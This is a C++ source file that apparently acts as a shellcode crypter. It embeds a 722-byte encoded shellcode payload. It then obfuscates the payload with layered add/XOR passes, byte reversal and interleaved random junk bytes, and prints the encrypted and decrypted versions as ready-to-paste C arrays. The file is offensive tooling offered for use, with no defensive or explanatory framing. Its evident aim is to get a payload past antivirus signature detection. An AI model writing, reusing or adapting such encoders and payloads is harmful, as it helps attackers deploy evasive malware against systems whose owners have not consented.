#include <iostream>
#include <Windows.h>

char* Encrypt(char* pShellcode, int sShellcodeSize, unsigned char bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] + bKey) & '\xFF') ^ bKey;
	}
	
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] + 'R') & '\xFF') ^ 'Q';
	}

	for (size_t i = 0; i < sShellcodeSize / 2; i++) {
		char temp = pShellcode[i];
		pShellcode[i] = pShellcode[sShellcodeSize - i - 1];
		pShellcode[sShellcodeSize - i - 1] = temp;
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] + '\\') & '\xFF') ^ '\n';
	}
	
	char* rShellcode = (char*)malloc(sizeof(char) * (2 * sShellcodeSize));

	for (size_t i = 0; i < 2 * sShellcodeSize; i++) {
		if (i % 2 == 0) {
			rShellcode[i] = pShellcode[i / 2];
		}
		else {
			rShellcode[i] = (char) rand() % 256;
		}
	}
	return rShellcode;
}
char* Decrypt(char* rShellcode, int sShellcodeSize, unsigned char bKey) {
	
	sShellcodeSize = sShellcodeSize / 2;
	char* pShellcode = (char*)malloc((sShellcodeSize) * sizeof(char));

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = rShellcode[i * 2];
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ '\n') - '\\') & '\xFF';
	}

	for (size_t i = 0; i < sShellcodeSize / 2; i++) {
		char temp = pShellcode[i];
		pShellcode[i] = pShellcode[sShellcodeSize - i - 1];
		pShellcode[sShellcodeSize - i - 1] = temp;
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ 'Q') - 'R') & '\xFF';
	}
	
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ bKey) - bKey) & '\xFF';
	}

	return pShellcode;
}


void Display(char* pShellcode, int sShellcodeSize) {
	printf("char shellcode[] =\n\"");

	// -1 to avoid terminator char
	for (size_t i = 0; i < sShellcodeSize; i++) {
		printf("\\x%02hhx", pShellcode[i]);
		if ((i+1) % 15 == 0) {
			printf("\"\n\"");
		}
	}
	printf("\";\n");

	printf("DWORD shellcodeSize = %d;\n\n", sShellcodeSize);
}
int main()
{
	char shellcode[] =
		"\xbf\x19\xfa\xfc\xfd\xd9\xcf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
		"\xae\x31\x7a\x15\x83\xea\xfc\x03\x7a\x11\xe2\xec\x06\x14\x72"
		"\x0e\xf7\xe5\xed\x87\x12\xd4\x3f\xf3\x57\x45\xf0\x70\x35\x66"
		"\x7b\xd4\xae\xfd\x09\xf0\xff\xfe\xe1\xb7\x4a\x27\xcf\x77\xe6"
		"\x1b\x4e\x0b\xf5\x4f\xb0\x32\x36\x82\xb1\x73\x80\xe8\x5e\x29"
		"\x98\x41\xb1\x9a\x15\x27\x8d\x25\xfa\x23\xad\x5d\x7f\xf3\x5a"
		"\xd1\x7e\x24\x29\xb1\xa0\x94\x2f\x92\x2a\x5c\x28\x91\xe4\x29"
		"\x74\xa8\x09\x98\x0f\xfe\x7e\x1a\xc6\xcf\x40\xb1\x27\xe0\x4c"
		"\xcb\x60\xc6\xae\xbe\x9a\x35\x52\xb9\x58\x44\x88\x4c\x7f\xee"
		"\x5b\xf6\x5b\x0f\x8f\x61\x2f\x03\x64\xe5\x77\x07\x7b\x2a\x0c"
		"\x33\xf0\xcd\xc3\xb2\x42\xea\xc7\x9f\x11\x93\x5e\x45\xf7\xac"
		"\x81\x21\xa8\x08\xc9\xc3\xbf\x2d\x32\x1c\xc0\x73\xa5\x8c\x5a"
		"\xf8\x35\x38\xd2\x69\x58\xd1\x48\x02\xe8\x56\x57\xd5\x0f\x4d"
		"\xa6\x02\xbc\x3e\x9a\xe7\x10\x28\x6f\x08\x97\xa8\xdd\x67\xed"
		"\xc1\xb1\x1b\x70\x3e\x7f\xca\x42\x60\x57\x45\xca\x0e\xc3\x06"
		"\x7b\xbd\x2b\x97\xd7\x61\x1d\x17\xf6\x51\x66\x77\x51\xf8\xf6"
		"\x41\x69\xc1\x26\xd6\xa7\x01\x0e\x06\x89\x19\x20\x2a\x6c\x8e"
		"\xa5\xd0\x25\x59\x52\x3a\x8f\xaa\xad\x6a\xdc\xfa\xf1\x5a\x69"
		"\x4a\xa6\xd7\x21\x66\x66\x84\xd0\x1d\x03\x74\x64\x84\xa8\x1f"
		"\x05\x6f\x0f\xa3\xb1\x1d\x20\x4e\x27\xce\x87\xa5\x89\x20\xd6"
		"\xf1\xe3\x73\x1e\xd4\x3d\x4a\x7e\x7b\x23\xca\x1f\x09\xca\x3d"
		"\xd5\xde\x3b\x6f\x26\x17\x44\x07\x72\x01\x3d\x70\x7d\x78\xee"
		"\x2d\xe8\x80\x42\x82\x84\xc6\x7b\x24\x55\x2f\xd9\x25\x55\xaf"
		"\xf1\x6a\x67\xe4\x39\x04\xfe\x92\x29\x87\x43\x15\xf3\x2f\x7d"
		"\xb4\x44\xd9\x13\x20\x21\x73\x8b\xe8\xe5\x4a\x22\xa5\x5d\xdf"
		"\xab\x08\x36\x73\x7b\xa2\xf0\xc3\xe8\x9e\x8f\xb7\xd6\x5c\x3d"
		"\x54\x52\x05\xed\xce\xdf\x88\x39\xad\x85\x7a\x16\x06\x69\x12"
		"\xd0\x23\xba\xaa\xaa\x81\x8c\x43\x17\x94\x63\xcc\xfc\x1a\x4c"
		"\x6b\x42\xd7\xe8\x25\x12\x3a\xa0\xb9\xc5\x3d\x2b\x71\x90\xe8"
		"\xc0\xa8\x31\x4b\x6f\xd5\xc9\x08\xdd\x2d\x1b\xac\xaf\x7c\x68"
		"\x40\x08\x17\xe4\x92\x23\xd4\xbb\x9b\xf4\x57\x64\x70\xa2\x36"
		"\xde\xe7\x0e\x80\xb3\xd6\x9c\x97\x79\x73\xb7\x10\x15\xf1\x45"
		"\xee\xa0\xbb\xdc\x25\x65\x13\x4d\x17\xdf\xfb\x41\xa6\xb7\xad"
		"\xc5\xa5\x2a\x33\x51\x7f\xdb\xc5\x0e\x30\x77\x7d\xd8\xa1\x04"
		"\x4b\x72\x4c\x91\x8b\xef\xd6\x26\x88\x83\x4f\x9a\x3c\x14\x15"
		"\xb1\xab\xd0\x8c\x3b\x19\x57\x63\x91\x32\x10\x10\xa8\x85\xe7"
		"\xb2\x40\x27\x72\x4d\xff\x0b\x82\xe1\x97\xc4\x0b\x9e\xae\x15"
		"\xde\x28\xe8\xba\x89\x2a\xc7\xd4\xce\x78\x74\x77\x98\x2d\x2c"
		"\x1f\xcd\x87\xfe\xe4\xee\xfd\x69\x70\x1b\xa1\xfd\x04\x28\x5d"
		"\xfe\x8d\xaf\x37\xfa\xdd\x45\xd7\x54\xb5\xec\xa1\xc6\xc3\xf0"
		"\xfb\xa4\x98\x5d\x57\x1d\x76\x4f\x51\xb9\xfd\x70\x88\x3c\xc1"
		"\xfa\x27\x57\x49\x17\x48\xa7\x21\x5c\xb8\x92\x51\xa3\xed\x92"
		"\xe4\x91\xe6\x66\x06\x2a\xf7\x12\x46\x42\xf7\xf2\x46\x92\x9f"
		"\xf2\x46\xd2\x5f\xa0\x2e\x8a\xfb\x15\x4b\xd5\xd1\x09\xc0\x79"
		"\x53\xca\xb1\x15\x63\x35\x3d\xe6\x30\x63\x55\xf4\x20\x02\x47"
		"\x07\x99\x90\x47\x8c\xed\x10\x40\x6c\x31\xa3\x8e\x1b\x50\xf4"
		"\xcd\xbb\x72\x6e\x2e\xbc\x7c\x40\xe9\x71\xad\x92\x3f\x4e\x9f"
		"\xe5\x0f\x97\xf1\x31\x5b\xe7\xb6\xca\x16\x45\x9e\x40\x58\xd9"
		"\xe0\x40";


	DWORD shellcodeSize = 722;

	char* encShellcode = Encrypt(shellcode, shellcodeSize, '"');
	char* decShellcode = Decrypt(encShellcode, shellcodeSize*2, '"');

	Display(encShellcode, shellcodeSize * 2);
	Display(decShellcode, shellcodeSize);

	return 0;
}
